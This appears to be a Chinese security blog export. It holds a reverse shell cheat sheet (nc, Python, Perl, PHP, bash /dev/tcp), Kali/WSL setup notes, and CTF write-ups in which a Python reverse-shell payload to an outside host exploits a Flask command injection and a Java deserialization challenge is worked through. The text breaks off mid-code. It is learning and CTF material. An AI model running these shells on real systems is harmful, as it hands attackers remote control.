<h3 id="nc"><a href="#nc" class="headerlink" title="nc"></a>nc</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -e &#x2F;bin&#x2F;bash host port</span><br></pre></td></tr></table></figure>

<blockquote>
<p>nc -e   inbound program to exec [dangerous!!]</p>
</blockquote>
<p>有些版本的NC没有-e选项，在本机开两个端口</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -lvp port1</span><br><span class="line">nc -lvp port2</span><br></pre></td></tr></table></figure>



<p>受控机</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc host port1 | &#x2F;bin&#x2F;bash | nc host port2</span><br></pre></td></tr></table></figure>

<blockquote>
<ul>
<li><p>管道命令，从host:pot1输入数据交给 /bin/bash处理，再交给host：port2输出</p>
</li>
<li><p>将nc 改成telnet 也是可以的</p>
</li>
</ul>
</blockquote>
<h3 id="python"><a href="#python" class="headerlink" title="python"></a>python</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python3 -c &#39;import socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;host&quot;,port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p&#x3D;subprocess.call([&quot;&#x2F;bin&#x2F;sh&quot;,&quot;-i&quot;]);&#39;</span><br></pre></td></tr></table></figure>



<h3 id="perl"><a href="#perl" class="headerlink" title="perl"></a>perl</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">perl -e &#39;use Socket;$i&#x3D;&quot;host&quot;;$p&#x3D;port;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;&#x2F;bin&#x2F;bash -i&quot;);&#125;;&#39;</span><br></pre></td></tr></table></figure>



<h3 id="php"><a href="#php" class="headerlink" title="php"></a>php</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">php -r &#39;$sock&#x3D;fsockopen(&quot;host&quot;,port);exec(&quot;&#x2F;bin&#x2F;bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>php反弹shell的这些方法都需要php关闭safe_mode这个选项，才可以使用exec函数</p>
</blockquote>
<h3 id="使用外置bash连接"><a href="#使用外置bash连接" class="headerlink" title="使用外置bash连接"></a>使用外置bash连接</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl http:&#x2F;&#x2F;ip:port&#x2F;shell</span><br></pre></td></tr></table></figure>

<p>shell内容</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;host&#x2F;port 0&gt;&amp;1</span><br></pre></td></tr></table></figure>





<p>参考连接</p>
<p><a href="https://www.freebuf.com/news/142195.html" target="_blank" rel="noopener">https://www.freebuf.com/news/142195.html</a></p>
<p><a href="https://www.freebuf.com/articles/system/147768.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/system/147768.html</a></p>
<p><a href="https://www.freebuf.com/articles/system/178150.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/system/178150.html</a></p>
<p><a href="https://www.freebuf.com/articles/system/153986.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/system/153986.html</a></p>
<p><a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet" target="_blank" rel="noopener">http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</a></p>
]]></content>
      <categories>
        <category>日常积累</category>
      </categories>
      <tags>
        <tag>shell</tag>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title>win子系统安装kali工具记录</title>
    <url>/2020/03/05/win%E5%AD%90%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85kali%E5%B7%A5%E5%85%B7%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<p>win下的子系统kali默认是不带有Metasploit</p>
<p>如果是其他linux安装需要换源</p>
<a id="more"></a>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vim &#x2F;etc&#x2F;apt&#x2F;sources.list</span><br></pre></td></tr></table></figure>

<p>会自动选取最近的源服务器</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">deb http:&#x2F;&#x2F;http.kali.org&#x2F;kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http:&#x2F;&#x2F;http.kali.org&#x2F;kali kali-rolling main non-free contrib</span><br></pre></td></tr></table></figure>

<p>换好之后就是更新一下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">apt update</span><br></pre></td></tr></table></figure>

<p>下载需要的工具例如Matesploit</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt-get install metasploit-framework</span><br></pre></td></tr></table></figure>

<p>安装好之后需要初始化postgres数据库</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo msfdb init</span><br></pre></td></tr></table></figure>

<p>安装ncat，sqlmap，nmap,aircrack-ng等</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt-get -y insatll ncat</span><br><span class="line">sudo apt-get -y insatll sqlmap</span><br><span class="line">sudo apt-get -y insatll nmap</span><br><span class="line">sudo apt-get -y insatll aircrack-ng</span><br></pre></td></tr></table></figure>



<p>在安装完wireshark后运行报错</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sx@QAQ:~$ wireshark</span><br><span class="line">wireshark: error while loading shared libraries: libQt5Core.so.5: cannot open shared object file: No such file or directory</span><br></pre></td></tr></table></figure>

<p>删除标签即可参考链接<a href="https://github.com/Microsoft/WSL/issues/3023" target="_blank" rel="noopener">https://github.com/Microsoft/WSL/issues/3023</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo strip --remove-section&#x3D;.note.ABI-tag &#x2F;usr&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libQt5Core.so.5.12.5</span><br></pre></td></tr></table></figure>



<p>记录一下更改用户名以及家目录</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">usermod -l NewUser -d &#x2F;home&#x2F;NewUser -m OldUser</span><br></pre></td></tr></table></figure>



<p>直接ping host</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ping: socket: Operation not permitted</span><br></pre></td></tr></table></figure>

<p>sudo ping 后正常</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ sudo ping 1.1.1.1</span><br><span class="line">PING 1.1.1.1 (1.1.1.1) 56(84) bytes of data.</span><br><span class="line">64 bytes from 1.1.1.1: icmp_seq&#x3D;1 ttl&#x3D;64 time&#x3D;188 ms</span><br><span class="line">64 bytes from 1.1.1.1: icmp_seq&#x3D;2 ttl&#x3D;64 time&#x3D;188 ms</span><br><span class="line">64 bytes from 1.1.1.1: icmp_seq&#x3D;3 ttl&#x3D;64 time&#x3D;191 ms</span><br><span class="line">64 bytes from 1.1.1.1: icmp_seq&#x3D;4 ttl&#x3D;64 time&#x3D;187 ms</span><br></pre></td></tr></table></figure>

<p>解决办法   chmod +s 就是给某个程序暂时root权限，运行后恢复正常权限</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ type ping</span><br><span class="line">ping is hashed (&#x2F;usr&#x2F;bin&#x2F;ping)</span><br><span class="line">$ sudo chmod +s &#x2F;usr&#x2F;bin&#x2F;ping</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>工具安装</tag>
      </tags>
  </entry>
  <entry>
    <title>v&amp;n内部赛</title>
    <url>/2020/02/29/v-n%E5%86%85%E9%83%A8%E8%B5%9B/</url>
    <content><![CDATA[<h2 id="HappyCTFd"><a href="#HappyCTFd" class="headerlink" title="HappyCTFd"></a>HappyCTFd</h2><p>打开发现是一个CTFD的平台，搜索一下发现存在漏洞CVE-2020-7245，修改admin的密码</p>
<p>发现有一个题目名字叫做flagflag你在哪</p>
<a id="more"></a>

<p>在file处有一个miaoflag文件打开就是flag</p>
<p><img src="/pic/125.png" alt=""></p>
<h2 id="CheckIN"><a href="#CheckIN" class="headerlink" title="CheckIN"></a>CheckIN</h2><p>打开题目就是源码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">flag_file = open(<span class="string">"flag.txt"</span>, <span class="string">"r"</span>)</span><br><span class="line"><span class="comment"># flag = flag_file.read()</span></span><br><span class="line"><span class="comment"># flag_file.close()</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># @app.route('/flag')</span></span><br><span class="line"><span class="comment"># def flag():</span></span><br><span class="line"><span class="comment">#     return flag</span></span><br><span class="line"><span class="comment">## want flag? naive!</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># You will never find the thing you want:) I think</span></span><br><span class="line"><span class="meta">@app.route('/shell')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shell</span><span class="params">()</span>:</span></span><br><span class="line">    os.system(<span class="string">"rm -f flag.txt"</span>)</span><br><span class="line">    exec_cmd = request.args.get(<span class="string">'c'</span>)</span><br><span class="line">    os.system(exec_cmd)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"1"</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">source</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> open(<span class="string">"app.py"</span>,<span class="string">"r"</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    app.run(host=<span class="string">'0.0.0.0'</span>)</span><br></pre></td></tr></table></figure>

<p>发现flag_file已经打开了flag.txt</p>
<p>可以执行系统命令，发现用bash弹shell用不了</p>
<p>使用DNS/OOB记录所有文件</p>
<p>DNS/OOB<a href="https://www.freebuf.com/articles/database/183997.html" target="_blank" rel="noopener">参考文章</a></p>
<p>手残了一下把（ls -R/）所有进行了dns解析</p>
<p>使用VPSnc监听12345端口</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -lvvp 12345</span><br></pre></td></tr></table></figure>

<p>payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?c&#x3D;python3 -c &#39;import socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;ns.seye.gq&quot;,12345));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p&#x3D;subprocess.call([&quot;&#x2F;bin&#x2F;sh&quot;,&quot;-i&quot;]);&#39;</span><br></pre></td></tr></table></figure>

<p>进去之后发现没有grep功能，</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ls -alR /</span><br></pre></td></tr></table></figure>



<p>列出所有文件搜索flag</p>
<p><img src="/pic/126.png" alt=""></p>
<h2 id="EasySpringMVC"><a href="#EasySpringMVC" class="headerlink" title="EasySpringMVC"></a>EasySpringMVC</h2><p>提供了源码，下载下来进行代码审计</p>
<p>ClientInfo类用来存定义用户数据</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ClientInfo</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">1L</span>;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> String group;</span><br><span class="line">    <span class="keyword">private</span> String id;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ClientInfo</span><span class="params">(String name, String group, String id)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">        <span class="keyword">this</span>.group = group;</span><br><span class="line">        <span class="keyword">this</span>.id = id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getGroup</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.group;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getId</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.id;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>Tools类用来处理序列化  <a href="https://www.runoob.com/java/java-serialization.html" target="_blank" rel="noopener">java序列化</a>   <a href="https://www.jianshu.com/p/10f4771909f9" target="_blank" rel="noopener">ProcessBuilder可导致命令执行</a></p>
<p>Java的反序列化和PHP反序列化类似，php在反序列化的时候会调用对应类的__wakeup()函数，而java会调用该类readObject()函数。 </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Source code recreated from a .class file by IntelliJ IDEA</span></span><br><span class="line"><span class="comment">// (powered by Fernflower decompiler)</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> com.tools;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Tools</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">1L</span>;</span><br><span class="line">    <span class="keyword">private</span> String testCall;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Tools</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">parse</span><span class="params">(<span class="keyword">byte</span>[] bytes)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> ByteArrayInputStream(bytes));</span><br><span class="line">        <span class="keyword">return</span> ois.readObject();   <span class="comment">//逆序列化</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] create(Object obj) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        ByteArrayOutputStream bos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream outputStream = <span class="keyword">new</span> ObjectOutputStream(bos);</span><br><span class="line">        outputStream.writeObject(obj);</span><br><span class="line">        <span class="keyword">return</span> bos.toByteArray();   <span class="comment">//序列化</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream in)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        Object obj = in.readObject();</span><br><span class="line">        (<span class="keyword">new</span> ProcessBuilder((String[])((String[])obj))).start();   <span class="comment">//命令执行</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ClientInfoFilter类用来处理Cookies</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Source code recreated from a .class file by IntelliJ IDEA</span></span><br><span class="line"><span class="comment">// (powered by Fernflower decompiler)</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> com.filters;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.tools.ClientInfo;</span><br><span class="line"><span class="keyword">import</span> com.tools.Tools;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64.Decoder;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64.Encoder;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.Filter;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.FilterChain;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.FilterConfig;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletResponse;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.Cookie;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ClentInfoFilter</span> <span class="keyword">implements</span> <span class="title">Filter</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ClentInfoFilter</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">(FilterConfig fcg)</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doFilter</span><span class="params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="keyword">throws</span> IOException, ServletException </span>&#123;</span><br><span class="line">        Cookie[] cookies = ((HttpServletRequest)request).getCookies();</span><br><span class="line">        <span class="keyword">boolean</span> exist = <span class="keyword">false</span>;</span><br><span class="line">        Cookie cookie = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">if</span> (cookies != <span class="keyword">null</span>) &#123;        </span><br><span class="line">            Cookie[] var7 = cookies;</span><br><span class="line">            <span class="keyword">int</span> var8 = cookies.length;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> var9 = <span class="number">0</span>; var9 &lt; var8; ++var9) &#123;</span><br><span class="line">                Cookie c = var7[var9];</span><br><span class="line">                <span class="keyword">if</span> (c.getName().equals(<span class="string">"cinfo"</span>)) &#123;</span><br><span class="line">                    exist = <span class="keyword">true</span>;</span><br><span class="line">                    cookie = c; <span class="comment">//如果cookies非空，cookie=cookies中“cinfo”中的值</span></span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">byte</span>[] bytes;</span><br><span class="line">        <span class="keyword">if</span> (exist) &#123;    <span class="comment">//如果cookies中存在“cinfo”</span></span><br><span class="line">            String b64 = cookie.getValue();</span><br><span class="line">            Decoder decoder = Base64.getDecoder();</span><br><span class="line">            bytes = decoder.decode(b64);  <span class="comment">//cookies中“cinfo”base64解码后的值</span></span><br><span class="line">            ClientInfo cinfo = <span class="keyword">null</span>;</span><br><span class="line">            <span class="keyword">if</span> (!b64.equals(<span class="string">""</span>) &amp;&amp; bytes != <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    cinfo = (ClientInfo)Tools.parse(bytes);  <span class="comment">//序列化</span></span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception var14) &#123;</span><br><span class="line">                    var14.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;   </span><br><span class="line">                cinfo = <span class="keyword">new</span> ClientInfo(<span class="string">"Anonymous"</span>, <span class="string">"normal"</span>, ((HttpServletRequest)request).getRequestedSessionId());</span><br><span class="line">                Encoder encoder = Base64.getEncoder();</span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    bytes = Tools.create(cinfo);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception var15) &#123;</span><br><span class="line">                    var15.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                cookie.setValue(encoder.encodeToString(bytes));</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            ((HttpServletRequest)request).getSession().setAttribute(<span class="string">"cinfo"</span>, cinfo);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            Encoder encoder = Base64.getEncoder();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;   <span class="comment">//设置返回cookies</span></span><br><span class="line">                ClientInfo cinfo = <span class="keyword">new</span> ClientInfo(<span class="string">"Anonymous"</span>, <span class="string">"normal"</span>, ((HttpServletRequest)request).getRequestedSessionId());</span><br><span class="line">                bytes = Tools.create(cinfo);</span><br><span class="line">                cookie = <span class="keyword">new</span> Cookie(<span class="string">"cinfo"</span>, encoder.encodeToString(bytes));</span><br><span class="line">                cookie.setMaxAge(<span class="number">86400</span>);</span><br><span class="line">                ((HttpServletResponse)response).addCookie(cookie);</span><br><span class="line">                ((HttpServletRequest)request).getSession().setAttribute(<span class="string">"cinfo"</span>, cinfo);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception var13) &#123;</span><br><span class="line">                var13.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        chain.doFilter(request, response);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">destroy</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>PictureController类中有两条路由</p>
<blockquote>
<p>showpic.form中用户 为admin可以任意文件读取</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequestMapping</span>(&#123;<span class="string">"/showpic.form"</span>&#125;)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">index</span><span class="params">(HttpServletRequest httpServletRequest, HttpServletResponse httpServletResponse, String file)</span> <span class="keyword">throws</span> Exception </span>&#123;<span class="comment">//获取get类型参数名为file</span></span><br><span class="line">        <span class="keyword">if</span> (file == <span class="keyword">null</span>) &#123;</span><br><span class="line">            file = <span class="string">"showpic.jsp"</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        String[] attribute = file.split(<span class="string">"\\."</span>);</span><br><span class="line">        String suffix = attribute[attribute.length - <span class="number">1</span>];</span><br><span class="line">        <span class="keyword">if</span> (!suffix.equals(<span class="string">"jsp"</span>)) &#123;</span><br><span class="line">            <span class="keyword">boolean</span> isadmin = ((ClientInfo)httpServletRequest.getSession().getAttribute(<span class="string">"cinfo"</span>)).getName().equals(<span class="string">"admin"</span>);</span><br><span class="line">            <span class="keyword">if</span> (isadmin || suffix.equals(<span class="string">"jpg"</span>) &amp;&amp; suffix.equals(<span class="string">"gif"</span>)) &#123;  </span><br><span class="line">                <span class="keyword">this</span>.show(httpServletRequest, httpServletResponse, file);</span><br><span class="line">                <span class="keyword">return</span> <span class="string">"showpic"</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="string">"onlypic"</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            StringBuilder stringBuilder = <span class="keyword">new</span> StringBuilder();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">int</span> unixSep;</span><br><span class="line">            <span class="keyword">for</span>(unixSep = <span class="number">0</span>; unixSep &lt; attribute.length - <span class="number">1</span>; ++unixSep) &#123;</span><br><span class="line">                stringBuilder.append(attribute[unixSep]);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            String jspFile = stringBuilder.toString();</span><br><span class="line">            unixSep = jspFile.lastIndexOf(<span class="number">47</span>);</span><br><span class="line">            <span class="keyword">int</span> winSep = jspFile.lastIndexOf(<span class="number">92</span>);</span><br><span class="line">            <span class="keyword">int</span> pos = winSep &gt; unixSep ? winSep : unixSep;</span><br><span class="line">            jspFile = pos != -<span class="number">1</span> ? jspFile.substring(pos + <span class="number">1</span>) : jspFile;</span><br><span class="line">            <span class="keyword">if</span> (jspFile.equals(<span class="string">""</span>)) &#123;</span><br><span class="line">                jspFile = <span class="string">"showpic"</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> jspFile;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">show</span><span class="params">(HttpServletRequest httpServletRequest, HttpServletResponse httpServletResponse, String filename)</span> <span class="keyword">throws</span> Exception </span>&#123;   </span><br><span class="line">        httpServletResponse.setContentType(<span class="string">"image/jpeg"</span>);</span><br><span class="line">        InputStream in = httpServletRequest.getServletContext().getResourceAsStream(<span class="string">"/WEB-INF/resource/"</span> + filename);</span><br><span class="line">        <span class="keyword">if</span> (in == <span class="keyword">null</span>) &#123;</span><br><span class="line">            in = <span class="keyword">new</span> FileInputStream(filename);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        OutputStream os = httpServletResponse.getOutputStream();</span><br><span class="line">        <span class="keyword">byte</span>[] b = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(((InputStream)in).read(b) != -<span class="number">1</span>) &#123;</span><br><span class="line">            os.write(b);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ((InputStream)in).close();</span><br><span class="line">        os.flush();</span><br><span class="line">        os.close();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>uploadpic.form中ClientInfo组要为webmanager用户 为admin可以文件上传</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequestMapping</span>(&#123;<span class="string">"/uploadpic.form"</span>&#125;)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">upload</span><span class="params">(MultipartFile file, HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ClientInfo cinfo = (ClientInfo)request.getSession().getAttribute(<span class="string">"cinfo"</span>);</span><br><span class="line">        <span class="keyword">if</span> (!cinfo.getGroup().equals(<span class="string">"webmanager"</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"notaccess"</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (file == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"uploadpic"</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            String originalFilename = ((DiskFileItem)((CommonsMultipartFile)file).getFileItem()).getName();</span><br><span class="line">            String realPath = request.getSession().getServletContext().getRealPath(<span class="string">"/WEB-INF/resource/"</span>);</span><br><span class="line">            String path = realPath + originalFilename;</span><br><span class="line">            file.transferTo(<span class="keyword">new</span> File(path));</span><br><span class="line">            request.getSession().setAttribute(<span class="string">"newpicfile"</span>, path);</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"uploadpic"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>



<p>先伪造一个组为webmanager，用户为admin的cookie</p>
<p>将CilentInfo类和Tools类原封不动的的复制到一个新项目中，再创建一个Test类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.tools.ClientInfo;</span><br><span class="line"><span class="keyword">import</span> com.tools.Tools;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span><span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Base64.Encoder encoder = Base64.getEncoder();</span><br><span class="line">        ClientInfo cinfo = <span class="keyword">new</span> ClientInfo(<span class="string">"admin"</span>,<span class="string">"webmanager"</span>,<span class="string">"1"</span>);</span><br><span class="line">        <span class="keyword">byte</span>[] bytes=Tools.create(cinfo);</span><br><span class="line">        System.out.println(encoder.encodeToString(bytes));    <span 